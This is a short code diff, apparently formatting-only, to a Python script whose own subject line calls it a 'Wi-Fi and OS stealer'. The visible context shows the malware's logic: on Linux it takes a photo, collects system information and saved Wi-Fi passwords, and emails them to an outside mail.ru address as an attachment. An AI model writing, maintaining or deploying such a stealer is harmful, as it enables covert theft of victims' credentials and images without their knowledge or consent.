@@ -189,7 +189,7 @@ def send_email(email_text: str):
     password = '<password>'
     dest_email = '<destination>@mail.ru'
     subject = 'Wi-Fi and OS stealer'
-    
+
     message = MIMEMultipart()
     message["From"] = email
     message["To"] = dest_email
@@ -202,7 +202,7 @@ def send_email(email_text: str):
     with open(filename, "rb") as attachment:
         part = MIMEBase("application", "octet-stream")
         part.set_payload(attachment.read())
-    
+
     encoders.encode_base64(part)
 
     part.add_header(
@@ -257,7 +257,7 @@ def check_os_system():
     elif os.name == 'posix':
         take_photo()
         email_text = get_system_info()
-        email_text +=  '\n' + get_linux_wifi_passwords()
+        email_text += '\n' + get_linux_wifi_passwords()
         send_email(email_text)
     else:
         raise NotImplemented('Only Windows or Linux =(')
